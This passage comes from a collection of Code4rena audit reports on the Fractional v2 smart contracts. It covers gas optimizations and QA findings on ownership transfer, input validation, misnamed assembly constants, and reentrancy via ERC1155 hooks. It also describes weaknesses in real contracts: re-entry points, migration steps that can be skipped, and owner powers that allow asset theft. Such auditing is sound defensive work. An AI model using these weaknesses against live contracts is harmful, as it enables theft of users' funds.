Finally, if both fields are accessed in the same function, can save **~42 gas per access** due to [not having to recalculate the key's keccak256 hash](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0) (Gkeccak256 - 30 gas) and that calculation's associated stack operations.  *There are 2 instances of this issue:* ```solidity File: src/FERC1155.sol  23        mapping(address => mapping(address => mapping(uint256 => bool))) 24            public isApproved; 25        /// @notice Mapping of metadata contracts for token ID types => metadata address 26        mapping(uint256 => address) public metadata; 27        /// @notice Mapping to track account nonces for metadata txs owner => nonces 28        mapping(address => uint256) public nonces; 29        /// @notice Mapping to track total supply for token ID types => totalSupply 30        mapping(uint256 => uint256) public totalSupply; 31        /// @notice Mapping to track royalty receivers for token ID types => royaltyAddress 32        mapping(uint256 => address) private royaltyAddress; 33        /// @notice Mapping to track the royalty percent for token ID types => royaltyPercent 34:       mapping(uint256 => uint256) private royaltyPercent;  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L23-L34  ```solidity File: src/modules/Migration.sol  45        mapping(address => mapping(uint256 => Proposal)) public migrationInfo; 46        /// @notice Mapping of a proposal ID to a user's ether contribution 47        mapping(uint256 => mapping(address => uint256)) private userProposalEth; 48        /// @notice Mapping of a proposal ID to a user's fractions contribution 49        mapping(uint256 => mapping(address => uint256)) 50:           private userProposalFractions;  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L45-L50  ### [G&#x2011;03]  State variables only set in the constructor should be declared `immutable` Avoids a Gsset (**20000 gas**) in the constructor, and replaces the first access in each transaction (Gcoldsload - **2100 gas**) and each access thereafter (Gwarmacces - **100 gas**) with a `PUSH32` (**3 gas**).  *There are 70 instances of this issue:* ```solidity File: src/modules/Buyout.sol  /// @audit registry 47:           registry = _registry;  /// @audit registry 61:           (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(  /// @audit registry 71:           uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);  /// @audit registry 114:          (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(  /// @audit registry 151:          (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(  /// @audit registry 186:          (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(  /// @audit registry 210:                  IVaultRegistry(registry).totalSupply(_vault) >  /// @audit registry 246:          (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(  /// @audit registry 267:          uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);  /// @audit registry 280:          (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);  /// @audit registry 288:          uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);  /// @audit registry 319:          (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);  /// @audit registry 351:          (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);  /// @audit registry 387:              (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);  /// @audit registry 424:              (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);  /// @audit supply 48:           supply = _supply;  /// @audit supply 219:              IVault(payable(_vault)).execute(supply, data, _burnProof);  /// @audit supply 264:          IVault(payable(_vault)).execute(supply, data, _burnProof);  /// @audit supply 294:          IVault(payable(_vault)).execute(supply, data, _burnProof);  /// @audit supply 476:              supply,  /// @audit supply 477:              ISupply(supply).burn.selector  /// @audit transfer 49:           transfer = _transfer;  /// @audit transfer 334:          IVault(payable(_vault)).execute(transfer, data, _erc20TransferProof);  /// @audit transfer 366:          IVault(payable(_vault)).execute(transfer, data, _erc721TransferProof);  /// @audit transfer 403:          IVault(payable(_vault)).execute(transfer, data, _erc1155TransferProof);  /// @audit transfer 441:              transfer,  /// @audit transfer 482:              transfer,  /// @audit transfer 483:              ITransfer(transfer).ERC20Transfer.selector  /// @audit transfer 488:              transfer,  /// @audit transfer 489:              ITransfer(transfer).ERC721TransferFrom.selector  /// @audit transfer 494:              transfer,  /// @audit transfer 495:              ITransfer(transfer).ERC1155TransferFrom.selector  /// @audit transfer 500:              transfer,  /// @audit transfer 501:              ITransfer(transfer).ERC1155BatchTransferFrom.selector  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L47  ```solidity File: src/modules/Migration.sol  /// @audit buyout 58:           buyout = payable(_buyout);  /// @audit buyout 84:           (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);  /// @audit buyout 116:          (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);  /// @audit buyout 148:          (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);  /// @audit buyout 189:          (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);  /// @audit buyout 208:              IFERC1155(token).setApprovalFor(address(buyout), id, true);  /// @audit buyout 210:              IBuyout(buyout).start{value: proposal.totalEth}(_vault);  /// @audit buyout 225:          (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);  /// @audit buyout 263:          (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);  /// @audit buyout 301:          (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);  /// @audit buyout 343:          IBuyout(buyout).withdrawERC20(  /// @audit buyout 367:          IBuyout(buyout).withdrawERC721(  /// @audit buyout 393:          IBuyout(buyout).withdrawERC1155(  /// @audit buyout 420:          IBuyout(buyout).batchWithdrawERC1155(  /// @audit buyout 438:          (, address proposer, State current, , , ) = IBuyout(buyout).buyoutInfo(  /// @audit buyout 447:          (, , , , , uint256 lastTotalSupply) = IBuyout(buyout).buyoutInfo(  /// @audit registry 59:           registry = _registry;  /// @audit registry 81:           (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);  /// @audit registry 95:           proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(  /// @audit registry 111:          (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(  /// @audit registry 143:          (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(  /// @audit registry 184:          (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(  /// @audit registry 200:              IVaultRegistry(registry).totalSupply(_vault),  /// @audit registry 235:          address newVault = IVaultRegistry(registry).create(  /// @audit registry 296:          (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(  /// @audit registry 435:          (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);  /// @audit registry 467:          (address token, uint256 newFractionId) = IVaultRegistry(registry)  /// @audit registry 470:          uint256 newTotalSupply = IVaultRegistry(registry).totalSupply(newVault);  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L58  ```solidity File: src/modules/Minter.sol  /// @audit supply 18:           supply = _supply;  /// @audit supply 40:               supply,  /// @audit supply 60:           IVault(payable(_vault)).execute(supply, data, _mintProof);  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Minter.sol#L18  ```solidity File: src/modules/protoforms/BaseVault.sol  /// @audit registry 25:           registry = _registry;  /// @audit registry 43:           vault = IVaultRegistry(registry).create(  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L25  ```solidity File: src/VaultFactory.sol  /// @audit implementation 21:           implementation = address(new Vault());  /// @audit implementation 39:           (uint256 creationPtr, uint256 creationSize) = implementation  /// @audit implementation 69:           vault = implementation.clone(salt, data);  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultFactory.sol#L21  ### [G&#x2011;04]  Structs can be packed into fewer storage slots Each slot saved can avoid an extra Gsset (**20000 gas**) for the first setting of the struct. Subsequent reads as well as writes have smaller gas savings  *There is 1 instance of this issue:* ```solidity File: src/interfaces/IMigration.sol  /// @audit Variable ordering with 10 slots instead of the current 11: ///           uint256(32):startTime, uint256(32):targetPrice, uint256(32):totalEth, uint256(32):totalFractions, address[](32):modules, address[](32):plugins, bytes4[](32):selectors, uint256(32):oldFractionSupply, uint256(32):newFractionSupply, address(20):newVault, bool(1):isCommited, bool(1):fractionsMigrated 8     struct Proposal { 9         // Start time of the migration proposal 10        uint256 startTime; 11        // Target buyout price for the migration 12        uint256 targetPrice; 13        // Total ether contributed to the migration 14        uint256 totalEth; 15        // Total fractions contributed to the migration 16        uint256 totalFractions; 17        // Module contract addresses proposed for the migration 18        address[] modules; 19        // Plugin contract addresses proposed for the migration 20        address[] plugins; 21        // Function selectors for the proposed plugins 22        bytes4[] selectors; 23        // Address for the new vault to migrate to (if buyout is succesful) 24        address newVault; 25        // Boolean status to check if the propoal is active 26        bool isCommited; 27        // Old fraction supply for a given vault 28        uint256 oldFractionSupply; 29        // New fraction supply for a given vault that has succesfully migrated 30        uint256 newFractionSupply; 31        // Boolean status to check that the fractions have already been migrated 32        bool fractionsMigrated; 33:   }  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/interfaces/IMigration.sol#L8-L33  ### [G&#x2011;05]  Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas When a function with a `memory` array is called externally, the `abi.decode()` step has to use a for-loop to copy each index of the `calldata` to the `memory` index. **Each iteration of this for-loop costs at least 60 gas** (i.e. `60 * <mem_array>.length`). Using `calldata` directly, obliviates the need for such a loop in the contract code and runtime execution. Note that even if an interface defines a function as having `memory` arguments, it's still valid for implementation contracs to use `calldata` arguments instead.   If the array is passed to an `internal` function which passes the array to another internal function where the array is modified and therefore `memory` is used in the `external` call, it's still more gass-efficient to use `calldata` when the `external` function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one  Note that I've also flagged instances where the function is `public` but can be marked as `external` since it's not called by the contract, and cases where a constructor is involved  *There are 15 instances of this issue:* ```solidity File: src/FERC1155.sol  /// @audit _uri 68:       function emitSetURI(uint256 _id, string memory _uri) external {  /// @audit _data 79        function mint( 80            address _to, 81            uint256 _id, 82            uint256 _amount, 83            bytes memory _data 84:       ) external onlyRegistry {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L68  ```solidity File: src/utils/MerkleBase.sol  /// @audit _proof 43        function verifyProof( 44            bytes32 _root, 45            bytes32[] memory _proof, 46            bytes32 _valueToProve 47:       ) public pure returns (bool) {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L43-L47  ```solidity File: src/utils/Metadata.sol  /// @audit _uri 24:       function setURI(uint256 _id, string memory _uri) external {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/Metadata.sol#L24  ```solidity File: src/VaultRegistry.sol  /// @audit _plugins /// @audit _selectors 51        function create( 52            bytes32 _merkleRoot, 53            address[] memory _plugins, 54            bytes4[] memory _selectors 55:       ) external returns (address vault) {  /// @audit _plugins /// @audit _selectors 67        function createFor( 68            bytes32 _merkleRoot, 69            address _owner, 70            address[] memory _plugins, 71            bytes4[] memory _selectors 72:       ) external returns (address vault) {  /// @audit _plugins /// @audit _selectors 83        function createCollection( 84            bytes32 _merkleRoot, 85            address[] memory _plugins, 86            bytes4[] memory _selectors 87:       ) external returns (address vault, address token) {  /// @audit _plugins /// @audit _selectors 102       function createInCollection( 103           bytes32 _merkleRoot, 104           address _token, 105           address[] memory _plugins, 106           bytes4[] memory _selectors 107:      ) external returns (address vault) {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L51-L55  ```solidity File: src/Vault.sol  /// @audit _selectors /// @audit _plugins 73:       function install(bytes4[] memory _selectors, address[] memory _plugins)  /// @audit _selectors 101:      function uninstall(bytes4[] memory _selectors) external {  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L73  ### [G&#x2011;06]  Using `storage` instead of `memory` for structs/arrays saves gas When fetching data from a storage location, assigning the data to a `memory` variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (**2100 gas**) for *each* field of the struct/array. If the fields are read from the new memory variable, they incur an additional `MLOAD` rather than a cheap stack read. Instead of declearing the variable with the `memory` keyword, declaring the variable with the `storage` keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a `memory` variable, is if the full struct/array is being returned by the function, is being passed to a function that requires `memory`, or if the array/struct is being read from another `memory` array/struct  *There are 2 instances of this issue:* ```solidity File: src/VaultRegistry.sol  40:           VaultInfo memory info = vaultToToken[msg.sender];  118:          VaultInfo memory info = vaultToToken[msg.sender];  ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L40  ### [G&#x2011;07]  State variables should be cached in stack variables rather than re-reading them from storage The instances below point to the second+ access of a state variable within a function. Caching of a state variable replace each Gwarmaccess (**100 gas**) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.  *There are 27 instances of this issue:* ```solidity File: src/FERC1155.sol  /// @audit _controller on line 303 305:              : controllerAddress = _controller;  ``` https://github.com/code-423n4/20"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/496", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "## Low  ### Prefer two step ownership transfers  Vault owners may transfer ownership of a vault contract in a single step by calling `transferOwnership`:  [`Vault#transferOwnership`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L93-L97)  ```solidity     function transferOwnership(address _newOwner) external {         if (owner != msg.sender) revert NotOwner(owner, msg.sender);         owner = _newOwner;         emit TransferOwnership(msg.sender, _newOwner);     } ```  Similarly, the `FERC1155` controller may be transferred in a single step:  [`FERC1155#transferController`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L228-L236)  ```solidity      function transferController(address _newController)         external         onlyController     {         if (_newController == address(0)) revert ZeroAddress();         _controller = _newController;         emit ControllerTransferred(_newController);     } ```  If the owner/controller is accidentally transferred to an incorrect address, ownership of these contracts may be permanently lost.  Consider introducing a mechanism for two-step ownership transfers.  ### Missing array length validations  [`Vault#install`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L73-L82) assumes that the `_selectors` and `_plugins` arrays are of equal length, but does not validate that they are equal.  ```solidity     function install(bytes4[] memory _selectors, address[] memory _plugins)         external     {         if (owner != msg.sender) revert NotOwner(owner, msg.sender);         uint256 length = _selectors.length;         for (uint256 i = 0; i < length; i++) {             methods[_selectors[i]] = _plugins[i];         }         emit InstallPlugin(_selectors, _plugins);     } ```  Unlike batch token transfers, there is a more limited impact here\u2014in the worst case, the user can call this function again to add the accidentally omitted plugin.   ### Gas reserve cannot be increased  Vaults define a `MIN_GAS_RESERVE` constant used to calculate the gas stipend used in [`Vault#_execute`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L128). If future gas costs increase, this stipend may be insufficient. Consider allowing the contract owner to increase the value of this parameter.  ## Informational  ## Solidity optimizer bugs in versions 0.8.13 and 0.8.14  Solidity versions 0.8.13 and 0.8.14 are vulnerable to an [optimizer bug](https://blog.soliditylang.org/2022/06/15/inline-assembly-memory-side-effects-bug/) related to inline assembly. Solidity 0.8.15 has been released with a fix.  This bug only occurs under very specific conditions: the legacy optimizer must be enabled rather than the IR pipeline (true for this project's current project configuration), and the affected assembly blocks must not refer to any local Solidity variables. Inline assembly used here, in Solmate, and in OpenZeppelin does not appear vulnerable. However, it's worth being aware of this vulnerability. Consider upgrading to Solidity 0.8.15.  ## QA  Your project `README` is a great high level intro to the core concepts in Fractional V2, but I'd encourage you to expand on this documentation. Including some worked examples of how components are intended to fit together would be really helpful, especially since Fractional intends to be an open, extensible hyperstructure.  I think it would be especially helpful to clarify how protocol components fit together in two broad scenarios: 1) \"normal\" users creating new vaults through the Fractional UI and 2) \"power\" users configuring vaults at a low level and creating new modules to extend the protocol.  For example, I was quite surprised to see that a vault owner can execute arbitrary calls that might bypass modules until I understood that vaults are not usually configured with EOA owners. This wasn't clear from reading the docs and my mental model of the protocol was wrong.  There are some very cool patterns in place in this codebase that others may want to adopt or build on!  ### Use `address.code.length`  [`Vault#_execute`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L119-L124) uses inline assembly to check that the target is a valid contract:  ```solidity         // Check that the target is a valid contract         uint256 codeSize;         assembly {             codeSize := extcodesize(_target)         }         if (codeSize == 0) revert TargetInvalid(_target); ```  In Solidity version `0.8.1` and later, `address.code.length` can be used to access code size. this is equivalent to the assembly version above, but more concise.  Suggestion:  ```solidity         if (_target.code.length == 0) revert TargetInvalid(_target); ```  ### Missing events A number of state changing functions do not emit corresponding events. Consider emitting events from these functions.  - [`Migration#propose`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L72) - [`Migration#join`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L105) - [`Migration#leave`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L141) - [`Migration#commit`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L179) - [`Migration#withdrawContribution`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L292) - [`FERC1155#royaltyInfo`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L241)  ### Misnamed constants  There are a handful of typos, misnamings, and inconsistencies in the constants used for functions implemented in assembly.  [`Transfer#ERC1155_SAFE_TRANSFER_FROM_signature`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/constants/Transfer.sol#L51-L53) has a trailing lowercase word, unlike other constants.  ```solidity uint256 constant ERC1155_SAFE_TRANSFER_FROM_signature = (     0xf242432a00000000000000000000000000000000000000000000000000000000 ); ```  The [`Transfer#TOKEN_TRANSFER_GENERTIC_`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/constants/Transfer.sol#L120-L129) constants should be `TOKEN_TRANSFER_GENERIC`.  ```solidity uint256 constant TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_SIGNATURE = (     0xf486bc8700000000000000000000000000000000000000000000000000000000 ); uint256 constant TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_SIG_PTR = 0x00; uint256 constant TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_TOKEN_PTR = 0x04; uint256 constant TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_FROM_PTR = 0x24; uint256 constant TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_TO_PTR = 0x44; uint256 constant TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_ID_PTR = 0x64; uint256 constant TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_AMOUNT_PTR = 0x84; uint256 constant TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_LENGTH = 0xa4; // 4 + 32 * 5 == 164 ```  Finally, [`Memory#EIGHT_BYTES`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/constants/Memory.sol#L18-L19) is actually `FOUR_BYTES`.  ```solidity uint256 constant EIGHT_BYTES = 0x04; ```  This is pretty confusing when used in [`Transfer#ERC1155BatchTransferFrom`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Transfer.sol#L474-L491), since the implementation is correct, but the offsets appear to be wrong:  ```solidity     function ERC1155BatchTransferFrom(         address, /*_token*/         address, /*_from*/         address, /*_to*/         uint256[] calldata, /*_ids*/         uint256[] calldata /*_amounts*/     ) external {         // Utilize assembly to perform an optimized ERC1155 batch transfer.         assembly {             // Write the function selector             // safeBatchTransferFrom(address,address,uint256[],uint256[],bytes)             mstore(                 ERC1155_BATCH_TRANSFER_FROM_OFFSET,                 ERC1155_SAFE_BATCH_TRANSFER_FROM_SIGNATURE             )              // Retrieve the token from calldata.             let token := calldataload(EIGHT_BYTES)              // If the token has no code, revert.             if iszero(extcodesize(token)) {                 mstore(NO_CONTRACT_ERROR_SIG_PTR, NO_CONTRACT_ERROR_SIGNATURE)                 mstore(NO_CONTRACT_ERROR_TOKEN_PTR, token)                 revert(NO_CONTRACT_ERROR_SIG_PTR, NO_CONTRACT_ERROR_LENGTH)             }              // Get the total number of supplied ids.             let idsLength := calldataload(                 add(EIGHT_BYTES, ERC1155_BATCH_TRANSFER_IDS_LENGTH_OFFSET)             )               // Rest of function omitted here...     } ```  ### Incorrect comments  The transfer in [`Buyout.sol#withdrawERC20`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L333-L334) is an ERC20 transfer, not an ERC721:  ```solidity         // Executes transfer of ERC721 token to caller         IVault(payable(_vault)).execute(transfer, data, _erc20TransferProof); ```  ### Unused imports - `IERC20` in [`Migration.sol`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L5)"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/476", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# 1. Code Summary  #### Code Quality and Test Coverage  In summary, the code quality of the Fractional was found to be high. The codes were also found to be well-documented and the team took the efforts to document the NatSpec for all the functions within the contracts. As a result, it is easy for the reader to understand the overall architecture and design of the system. However, some minor errors within the comments were observed. Although it does not cause any technical issues or result in a loss of fund, it is recommended for the team to review them and update them accordingly to ensure that the documentation reflects what the system does accurately.  Further improvement to the code readability can be made by using a modifier, refer to the \"Use modifier for better readability and code reuse\" below. Another key concern that is the functions within the `Supply` and `Transfer` contracts are implemented entirely in assembly. Even though assembly code was used for gas optimization, it reduces the readability (and future updatability) of the code. Consider eliminating all assembly code and re-implement them in Solidity to make the code significantly more clean.  Test coverage was found to be high. All the key features were found to be covered in the test.  # 2. Key Risks & Improvement Opportunities  #### Excessive Power Holds By Vault Owner  Fractional allows vault owners to install custom plugins to extend the functionality of the vault during or after deployment. The plugins within the vault could theoretically perform any task such as transferring the asset from the vault to an arbitrary wallet address or minting any amount of new fractional tokens. Therefore, it is critical for the fractional token holders of a vault to be aware of this risk and the token holders must ensure that the vault owner is trustworthy.  Under normal circumstances, the vault owner will be Fractional's `VaultRegistry` contract, which does not pose much of an issue because `VaultRegistry` contract is considered a trusted entity within Fractional protocol. However, potential fractional token investors should take note that some vaults can be created via `VaultRegistry.createFor`, which will transfer the ownership of the vault to an arbitrary address. In such a case, potential investors must ensure that the new vault owner is trustworthy enough not to perform a rug pull or steal the assets in the vault.  Consider documenting this risk if needed so that potential fractional token holders can make an informed decision.  #### Conflicting Module Might Block Functionality Of Another Module  Both the `Buyout` and `Migration` modules depend heavily on the state of the vault (e.g. INACTIVE, LIVE, SUCCESS) to determine if a function can be executed at any point in time. For instance, a buyout can only be started only if the vault state is \"INACTIVE\", or a migration can only be settled if the vault state is \"SUCCESS\".  A module changing the vault state might cause unintended behavior in another module. For instance, when a buyer starts an auction within the `Buyout` module, it will cause the vault state to change to `State.LIVE`. As a result, it will cause contributors of a proposal within the `Migration` module to be unable to withdraw their contributed assets from the proposal because the `Migration.withdrawContribution` function requires the vault state to be `State.INACTIVE`. Thus, contributor assets are stuck in the `Migration` contract whenever a buyer starts an auction in the `Buyout` module.  It is recommended to take extra caution when writing the module to ensure that it does not accidentally block the functionality of another module.  #### Step In A Process Can Be Bypassed Or Triggered In An Out-of-Order Manner  To ensure that the vault operates in an expected manner, it is important that the contracts prevent users from calling functions in an out-of-order manner or bypassing certain step in a process. It was observed that it is possible for users to call the function in an out-of-order manner or bypass certain step in a process entirely. Following illustrates some of the examples:   - A user can call `Migration.settleVault ` follow by `Migration.migrateFractions `, thus skipping the `Migration.settleFractions` - A contributor should call `Migration.leave` to leave a proposed migration to get back their asset if the proposal has not been committed yet. However, instead of calling `Migration.leave`, the contributor can choose to call `Migration.withdrawContribution` which will succeed without any revert.  Ensure that the sequence in a process (e.g. buyout or migration process) is strictly followed and enforced.  #### Re-entrancy Risks  The key features of the protocols were found to be following the \"Checks Effects Interactions\" pattern rigorously, which helps to prevent any possible re-entrancy attack. So far no re-entrancy attack that can lead to loss of asset was observed during the contest. However, further improvements can be made to guard against future re-entrancy attacks in case any attack vector is missed out by C4's wardens during the contest.   A number of key functions within `Buyout` and `Migration` modules deal with ERC1155, which contains a hook that will make a callback to the recipient whenever a transfer occurs, thus increasing the risk of a re-entrancy attack. Refer to the \"Lack Of Reentrancy Guards\" issue for more details.  Thus, it would be prudent to implement additional reentrancy prevention wherever possible by utilizing the `nonReentrant` modifier from [Openzeppelin Library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol) to block possible re-entrancy as a defense-in-depth measure.  #### Input Validation  Although input validation has been already implemented in the majority of the functions, it can be further strengthened to thwart potential attacks or prevent unexpected behavior in the future. For instance, `Vault.transferOwnership` does not check if the ownership is being transferred to `address(0)`, which might affect the functionality of the vault.  # 3. Summary Of Findings  The following is a summary of the low and non-critical findings observed during the contest.  | No.  | Title                                                        | Risk Rating  | | ---- | ------------------------------------------------------------ | ------------ | | 4.1  | Lack Of Reentrancy Guards                                    | Low          | | 4.2  | Migration Sequence Not Enforced                              | Low          | | 4.3  | State Variable Visibility Is Not Set                         | Low          | | 4.4  | Risk of Plugins                                              | Low          | | 4.5  | Ether Might Stuck In `Vault.sol`                             | Low          | | 4.6  | Ownership May Be Burned                                      | Low          | | 4.7  | Array Length Not Validated                                   | Low          | | 4.8  | Consider Two-Phase Ownership Transfer                        | Low          | | 4.9  | Migration Proposer Can Hijack Other User's Buyout To Settle A Vault | Low          | | 5.1  | Incorrect Comment                                            | Non-Critical | | 5.2  | Use Modifier For Better Readability And Code Reuse           | Non-Critical | | 5.3  | Assembly Within `Supply.sol` and `Transfer.sol`              | Non-Critical | | 5.4  | Variable Should Be Called `isInit` Instead Of `Nonce`        | Non-Critical |    # 4. Low Risk Issues  ## 4.1   Lack Of Reentrancy Guards  #### Description  Whenever `IERC1155(token).safeTransferFrom` is called, the `to` address can re-enter back to the contracts due to the `ERC1155TokenReceiver(to).onERC1155Received(msg.sender, from, id, amount, data)` code (hook)  https://github.com/Rari-Capital/solmate/blob/03e425421b24c4f75e4a3209b019b367847b7708/src/tokens/ERC1155.sol#L55  ```solidity function safeTransferFrom(     address from,     address to,     uint256 id,     uint256 amount,     bytes calldata data ) public virtual {     require(msg.sender == from || isApprovedForAll[from][msg.sender], \"NOT_AUTHORIZED\");      balanceOf[from][id] -= amount;     balanceOf[to][id] += amount;      emit TransferSingle(msg.sender, from, to, id, amount);      require(         to.code.length == 0             ? to != address(0)             : ERC1155TokenReceiver(to).onERC1155Received(msg.sender, from, id, amount, data) ==                 ERC1155TokenReceiver.onERC1155Received.selector,         \"UNSAFE_RECIPIENT\"     ); } ```  The following functions utilise `IERC1155(token).safeTransferFrom` that allows the caller or proposer to re-enter back to the contracts  - [`Buyout.buyFractions`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L149)  - [`Buyout.end`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L184)  - [`Migration.leave`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L141)  - [`Migration.withdrawContribution`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L292)  #### Recommendation  Apply necessary reentrancy prevention by utilizing the OpenZeppelin's nonReentrant modifier to block possible re-entrancy.    ## 4.2 Migration Sequence Not Enforced  #### Description  Functions should be called in the following sequence to migrate a vault after a successful buyout.  1. `Migration.settleVault` - Create new vault  2. `Migration.settleFractions` - Mint new fractional tokens to new vault  3. `Migration.migrateFractions` - Give investors the new fractional token  However, a user can call `Migration.settleVault ` follow by `Migration.migrateFractions `, thus skipping the `Migration.settleFractions`.  Although it does not result in any loss of asset, allowing users to call the functions pertaining to migration in an out-of-order manner might cause unintended consequence in the future.  #### Recommendation  After the `Migration.settleFractions` has been executed, the `migrationInfo[_vault][_proposalId].fractionsMigrated` will be set to `true`.  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L257  ```solidity function settleFractions(     address _vault,     uint256 _proposalId,     bytes32[] calldata _mintProof ) external {     ..SNIP..     migrationInfo[_vault][_proposalId].fractionsMigrated = true; } ```  Within the 